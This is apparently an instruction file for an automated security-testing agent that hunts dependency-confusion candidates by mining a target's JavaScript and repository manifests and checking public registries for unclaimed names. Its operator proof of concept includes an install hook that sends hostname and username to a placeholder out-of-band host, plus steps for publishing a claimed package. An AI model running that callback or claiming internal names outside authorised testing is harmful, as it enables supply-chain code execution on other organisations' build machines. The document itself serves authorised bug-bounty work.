# Dependency confusion — discovery and validation (read this first)

Dependency confusion: a build pulls a *public* package because an attacker
published it under the same name as the target's *private/internal* package,
with a higher version. The win is RCE on a build/dev machine. This phase finds
and VALIDATES the precondition automatically; the operator does the publish PoC
by hand (publishing is blocked for the run on purpose).

What makes a real candidate, in one line:
**an internal package name the target actually depends on, that is UNCLAIMED on
the matching public registry (or whose public scope is unclaimed).**

## 1. Collect candidate package names (two sources)

### a. The target's own JavaScript (already harvested in phase 06)
- Read the JS archive the js phase saved (see `hk handoff` for 06-js and its
  work dir), plus any bundles under the mapped hosts. Do NOT re-fetch target
  hosts needlessly - reuse what 06-js already pulled; fetch a missing bundle
  with curl (it goes through the proxy).
- Extract module specifiers robustly, not with a single fragile regex:
  - `require("X")`, `import ... from "X"`, `import("X")`, `from "X"`.
  - webpack/rollup maps: `__webpack_require__`, module tables, `"name":` in an
    inlined `package.json`.
  - For real structure use node's parser if available:
    `node -e 'const acorn=require("acorn"); ...'` or a small AST walk; fall back
    to careful regex when a parser is not installed.
- Keep only *package* specifiers. DROP relative/local paths (`./`, `../`, `/`),
  URLs, data: URIs, single letters, and pure webpack internals.

### b. The target's GitHub org (if known from the dork phase)
- Reuse the org from phase 01b (`hk handoff`, `hk leads`, notes). With
  $GITHUB_TOKEN, read manifests in the org's repos:
  - npm: `package.json` (`dependencies`, `devDependencies`, `peerDependencies`),
    `.npmrc` (scopes mapped to a private registry are a strong signal).
  - pip: `requirements.txt`, `setup.py`, `pyproject.toml`, `Pipfile`.
  - gem: `Gemfile`, `*.gemspec`.
- `.npmrc`/`.pip.conf` lines like `@acme:registry=https://nexus.acme.internal`
  or `--index-url https://pypi.acme.internal` tell you the scope/prefix that is
  private - every dependency under it is a candidate if unclaimed publicly.

## 2. Classify the ecosystem per name
- npm (default for JS): bare `name` or scoped `@scope/name`.
- pip: PEP 503 normalises names (lowercase, `-`/`_`/`.` collapse to `-`).
- gem: exact name.
- composer (PHP, `composer.json` `require`): `vendor/package`; check the whole
  `vendor` too (an unclaimed vendor namespace is the strong case).

## 3. Cross-reference the PUBLIC registry (read-only GET, the key test)
For each candidate, a GET decides it - but only a **confirmed 404** counts as
unclaimed. A single request can lie: a transient 5xx, a network error, a
rate-limit (429/503), or a proxy block all return non-200 without meaning the
name is free. So:
- **404** on a clean retry = unclaimed = candidate.
- **200** = already public (usually NOT a candidate - a normal public dep)
  unless the public owner is clearly unrelated and the target pins a higher
  internal version.
- **anything else (000/429/5xx/403/timeout)** = UNKNOWN, not a candidate.
  Retry once after a short pause; if it still is not a clean 404 or 200, record
  it as a weak lead marked `registry-check=unknown`, never as a finding. Do not
  turn a failed lookup into "unclaimed".
Make the call twice (or `--retry 2`) and treat only a stable 404 as unclaimed:
- npm:   `curl -s --retry 2 --max-time 15 -o /dev/null -w "%{http_code}" https://registry.npmjs.org/<name>`
         (URL-encode a scope slash: `@acme/foo` -> `@acme%2Ffoo`)
- npm scope: if `@acme/*` is used, an **unclaimed scope** means every `@acme/x`
         is claimable - the strongest case. Confirm the scope is unclaimed with
         BOTH endpoints (an org can be registered as a user or an org):
         `https://registry.npmjs.org/-/org/<scope>/package` AND
         `https://www.npmjs.com/~<scope>` / `https://www.npmjs.com/org/<scope>`.
         Only call a scope unclaimed when org AND user both 404. If ONE resolves,
         the scope is owned (often a defensive empty registration) -> NOT a
         candidate; note it as "scope defended".
- pip:   `curl -s --retry 2 --max-time 15 -o /dev/null -w "%{http_code}" https://pypi.org/pypi/<name>/json`
- gem:   `curl -s --retry 2 --max-time 15 -o /dev/null -w "%{http_code}" https://rubygems.org/api/v1/gems/<name>.json`
- composer: `curl -s --retry 2 --max-time 15 -o /dev/null -w "%{http_code}" https://repo.packagist.org/p2/<vendor>/<package>.json`

### Already-held names (do not re-report)
A name published only as a `0.0.1-security` (or similarly tiny "security
placeholder") version is a name a researcher has ALREADY locked and almost
certainly already reported. Treat it as **taken** - it is not claimable, so it
is NOT your candidate. Note it as "already held (security placeholder)" and move
on; never file it as a finding.

## 4. Filter to high confidence (avoid noise)
Keep a candidate only when ALL hold:
- the name is clearly a dependency the TARGET uses (its repo manifest or its own
  JS bundle - not a transitive mention in a third-party vendor blob);
- it is unclaimed publicly (confirmed 404), or its scope is unclaimed (org AND
  user both 404);
- it is not a typo of a famous package (that is typosquatting, a different bug),
  and not an obvious placeholder/example/local name;
- it is not an already-held security-placeholder name (step 3).
Scoped internal names (`@company/...`) with an unclaimed scope are the strongest
and cleanest to prove.

### Provenance: whose package is it? (same rule as the dork phase)
Dependency confusion is only in scope when the package is consumed by the
TARGET's own first-party code - not by a third party's blob that merely happens
to be hosted on, or embedded in, a target page. For each candidate, establish
where the reference actually lives:
- **first-party**: the specifier comes from the target's own bundle/app code or
  a manifest in the target's own GitHub org -> in scope, finding-track.
- **third-party**: the specifier comes only from an embedded seller / partner /
  integrator / vendor widget, an iframe's own bundle, a customer-uploaded blob,
  or any script whose owner is not the target -> OUT OF SCOPE. Record it as a
  lead (`provenance=third-party`), do NOT file it as a finding, and do NOT PoC
  it: claiming a name a third party depends on would affect that third party,
  not the target.
When you cannot establish that the consuming code is the target's own, default
to third-party (lead), exactly as the dork phase defaults unproven affiliation
to out-of-scope. Never guess a seller's widget into a first-party finding.

## 5. Record (NO publishing - that is the operator's manual step)
Severity reflects CONFIDENCE. What this phase can prove is the *precondition*
(referenced + unclaimed), NOT that a build actually resolves the public registry
- that is only known after the operator's callback PoC. So:
- record first-party, confirmed-unclaimed candidates at **--severity medium**
  with the status left at `candidate` (the default), and
- state the limit plainly in the summary: "UNCONFIRMED - reachability not yet
  proven; needs the operator publish+callback PoC to confirm a build resolves
  public npm."
Only after a callback confirms a real build/dev host pulled the package does it
become high/critical - the operator (or the validate phase) raises it then.

For each first-party, high-confidence candidate:
  `hk finding add --kind dependency-confusion --severity medium --url <source: the
  github file URL or the JS bundle URL> --summary "internal <eco> package
  '<name>' used by <first-party where> is unclaimed on <registry> (scope
  unclaimed: org+user 404). UNCONFIRMED - reachability not proven" --steps
  "<source + evidence + the confirmed registry 404s> + the operator PoC below"
  --impact "IF a build resolves the public registry, an attacker-published
  <name>@<higher-version> runs on the build/dev host (RCE). Not yet confirmed
  reachable."`.
Weaker/uncertain ones (registry-check unknown, provenance third-party, or you
could not confirm first-party use) -> `hk add lead dependency-confusion
<source-url> --evidence "<name> on <eco>, registry says <code>,
provenance=<first|third>-party"`.
Then `hk notify "Dependency confusion candidate" "<name> (<eco>) unclaimed -
source <url>"` so the operator sees it.

NEVER run `npm publish` / `twine upload` / `gem push` (the run blocks them). The
PoC below is for the OPERATOR to run by hand.

## 6. Operator's manual PoC (put these exact steps in the finding's notes)
Two-stage, human-in-the-loop:
1. **Reserve** immediately: publish a benign placeholder (version 1.0.0, empty
   scripts, a harmless index) so no one else claims the name.
2. After ~24h, **callback payload**: bump to a high version (e.g. 99.99.1) with a
   pre/postinstall that curls the operator's OOB listener with a per-package
   token, e.g. `http://<OOB_HOST>:<PORT>/depconf/<name>/?h=$(hostname)&u=$(whoami)`.
   (Use the run's OOB host from `hunt oob`.) A callback = confirmed.
3. **Attribute the callback**: ARIN/RDAP the source IP
   (`https://search.arin.net/rdap/?query=<ip>`). Ignore cloud/scanner ranges
   (AWS/GCP/Azure); a hit from the target's ASN or local ISP = a real build/dev
   machine = report it.
4. Release the name afterwards so the company can reclaim it, and say so in the
   report.
```
PKG=<name>; mkdir "$PKG"; cd "$PKG"
cat > package.json <<EOF
{ "name":"$PKG","version":"1.0.0","description":"placeholder","main":"index.js",
  "scripts":{}, "license":"ISC" }
EOF
echo '// benign placeholder' > index.js
# OPERATOR runs this by hand, not the automation:
#   npm publish --access public
```

## 7. Scale later
Same shape works for GitLab org scanning and other ecosystems (Maven groupId,
Go module paths) - add them as more sources without changing the registry-check
and record steps.
